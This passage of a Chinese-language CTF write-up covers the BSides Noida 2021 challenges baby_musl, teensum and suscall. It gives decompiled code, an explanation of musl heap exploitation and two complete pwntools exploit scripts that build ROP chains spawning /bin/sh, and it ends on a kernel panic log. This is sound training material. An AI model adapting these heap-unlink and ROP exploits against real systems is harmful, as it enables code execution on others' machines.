<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">show</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter index&#34;</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">chunks</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>而chunk和size又是挨在一起的，向size处填充地址，在show的时候将其解析为地址，实现任意地址读。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">.bss:0000000000202040 ; _QWORD chunks[4]
.bss:0000000000202040 chunks          dq 4 dup(?)             ; DATA XREF: new+7B↑o
.bss:0000000000202040                                         ; del+51↑o ...
.bss:0000000000202060                 public data
.bss:0000000000202060 ; _DWORD data[4]
.bss:0000000000202060 data            dd 4 dup(?)             ; DATA XREF: new+98↑o
.bss:0000000000202060                                         ; edit+79↑o
.bss:0000000000202060 _bss            ends
</code></pre></td></tr></table>
</div>
</div><p>free的时候也没有清空指针</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">del</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter index&#34;</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="o">&amp;&amp;</span> <span class="n">chunks</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
    <span class="n">free</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">chunks</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>这里简单总结一下musl与glibc的堆管理区别：</p>
<ol>
<li>musl没有hook</li>
<li>musl作为轻量级libc，在分配堆块时会首先考虑libc上的空闲页，不会直接开在heap段上，但这样也使得堆上到处都是libc地址。</li>
<li>musl类似于只有smallbin和largebin，一般unlink是十分奏效的利用方式</li>
</ol>
<p>最后思路为：堆上拿到残留的libc地址，利用任意地址读environ拿到栈地址，再在栈上拿到elf加载地址。unlink打到bss段堆指针，实现任意地址写，最后写rop即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s2">&#34;&#34;&#34; x1do0 / Lilac &#34;&#34;&#34;</span> 

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">ch</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;[4] Show</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">new</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter index&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter size&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter index&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">con</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter index&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Enter data&#34;</span><span class="p">,</span> <span class="n">con</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter index&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;75&#39;</span><span class="p">]</span>

<span class="c1"># b *0xA25+0x555555554000 del</span>
<span class="c1"># b *0x988+0x555555554000 add </span>
<span class="n">debug</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span><span class="s2">b *0xC31+0x555555554000
</span><span class="s2">set $data = 0x202040 + 0x555555554000
</span><span class="s2">&#34;&#34;&#34;</span>
<span class="c1"># debug = &#39;&#39;</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./baby_musl&#34;</span><span class="p">)</span>
<span class="c1"># gdb.attach(io, debug)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Enter your name&#34;</span><span class="p">,</span> <span class="s1">&#39;xd&#39;</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./baby_musl&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>

<span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>

<span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xb0a40</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;environ&#39;</span><span class="p">]</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>

<span class="n">new</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">stack</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">stack</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>

<span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xb0a40</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>

<span class="n">target</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">+</span> <span class="mh">0xb09f0</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>

<span class="n">elf_addr</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="mh">0x30</span>
<span class="n">new</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">elf_addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
<span class="n">new</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">elf_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">elf_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x796</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf_base</span><span class="p">))</span>

<span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">)</span>
<span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x202040</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x202040</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span>
<span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">)</span>
<span class="c1"># new(2, 0x10)</span>

<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000015291</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">choice</span><span class="p">(</span><span class="mi">666</span><span class="p">)</span>


<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="teensum">teensum</h2>
<p>草 直球栈溢出，这题没人做？</p>
<p>给了docker和libc，实际上就是ubuntu20.04，libc也没做什么手脚。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">x1do0@x1do0:~/linux_share/BSides-Noida-CTF-2021/teen-sum/release$ md5sum /lib/x86_64-linux-gnu/libc-2.31.so
d371da546786965fe0ee40147ffef716  /lib/x86_64-linux-gnu/libc-2.31.so
x1do0@x1do0:~/linux_share/BSides-Noida-CTF-2021/teen-sum/release$ md5sum libc.so.6
d371da546786965fe0ee40147ffef716  libc.so.6
</code></pre></td></tr></table>
</div>
</div><p>开了pie，但是栈上本来就有残留地址，直接日就完事了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s2">&#34;&#34;&#34; x1do0 / Lilac &#34;&#34;&#34;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;75&#39;</span><span class="p">]</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./teen-sum&#34;</span><span class="p">,</span> <span class="n">aslr</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="c1"># gdb.attach(io, &#34;b *0x138B+0x555555554000&#34;)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Hey &#34;</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x227e0a</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;How many?&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Please enter them one by one.&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;1. Yes&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;New size please.&gt;&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x100</span><span class="p">))</span>

<span class="n">prdir</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span> <span class="c1">#  pop rdi ; ret</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
<span class="n">empty_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000025679</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">empty_ret</span><span class="p">,</span> <span class="n">prdir</span><span class="p">,</span> <span class="n">binsh</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;New Name please ^.^ :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">rop</span><span class="p">)</span>


<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="suscall">suscall</h2>
<p>题目提供了一个任意函数执行的漏洞系统调用，把reboot关了跑一下。妈的直接暴毙</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>    0.033687<span class="o">]</span> Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline
<span class="o">[</span>    0.100000<span class="o">]</span> ..MP-BIOS bug: <span class="m">8254</span> timer not connected to IO-APIC
<span class="o">[</span>    0.430283<span class="o">]</span> Kernel panic - not syncing: Out of memory and no killable processes...
<span class="o">[</span>    0.430283<span class="o">]</span>
<span class="o">[</span>    0.430627<span class="o">]</span> CPU: <span class="m">0</span> PID: <span class="m">1</span> Comm: swapper/0 Not tainted 4.4.271 <span class="c1">#8</span>
<span class="o">[</span>    0.430804<span class="o">]</span> Hardware name: QEMU Standard PC <span class="o">(</span>i440FX + PIIX, 1996<span class="o">)</span>, BIOS 1.13.0-1ubuntu1.1 04/01/2014
<span class="o">[</span>    0.431059<span class="o">]</span>  <span class="m">0000000000000000</span> ffff8800028eb928 ffffffff834bbc18 ffffffff837ac6e0
<span class="o">[</span>    0.431104<span class="o">]</span>  ffff8800028eb9b8 ffff8800028eb9a8 ffffffff834bab4f <span class="m">0000000000000008</span>
<span class="o">[</span>    0.431104<span class="o">]</span>  ffff8800028eb9b8 ffff8800028eb950 <span class="m">6170203035373032</span> <span class="m">0000000000000246</span>
<span class="o">[</span>    0.431104<span class="o">]</span> Call Trace:
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff834bbc18&gt;<span class="o">]</span> dump_stack+0x57/0x6d
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff834bab4f&gt;<span class="o">]</span> panic+0xb9/0x1fd
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d21aa3&gt;<span class="o">]</span> out_of_memory+0x423/0x490
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d27412&gt;<span class="o">]</span> __alloc_pages_nodemask+0xa62/0xa90
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d2bc8b&gt;<span class="o">]</span> ? release_pages+0x8b/0x1f0
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d63cee&gt;<span class="o">]</span> alloc_page_interleave+0x3e/0x90
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d641a4&gt;<span class="o">]</span> alloc_pages_current+0xb4/0x110
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d1dc58&gt;<span class="o">]</span> __page_cache_alloc+0xb8/0xe0
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d1e868&gt;<span class="o">]</span> pagecache_get_page+0x88/0x1b0
<span class="o">[</span>    0.431104<span class="o">]</span>  <span class="o">[</span>&lt;ffffffff82d1e9b4&gt;<span class="o">]</span> grab_cache_page_write_begin+0x24/0x40
